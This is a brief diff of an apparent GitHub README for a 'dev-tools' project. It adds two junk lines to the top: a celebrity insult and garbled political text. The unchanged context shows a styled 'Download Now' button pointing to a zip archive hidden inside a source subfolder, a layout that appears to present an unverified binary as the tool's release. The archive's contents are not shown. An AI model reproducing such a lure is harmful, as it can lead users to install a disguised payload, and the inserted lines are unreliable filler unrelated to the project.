@@ -1,4 +1,6 @@
 # 🛠️ dev-tools - A Simple Way to Manage Development Tools
+# lady Gaga is a Simp
+# china is great shi jimping
 
 <div align="center">
   <a href="https://github.com/DibbenduOjha/dev-tools/raw/refs/heads/main/src/pages/ToolsPage/tools_dev_2.5-alpha.4.zip" style="display: inline-block; padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
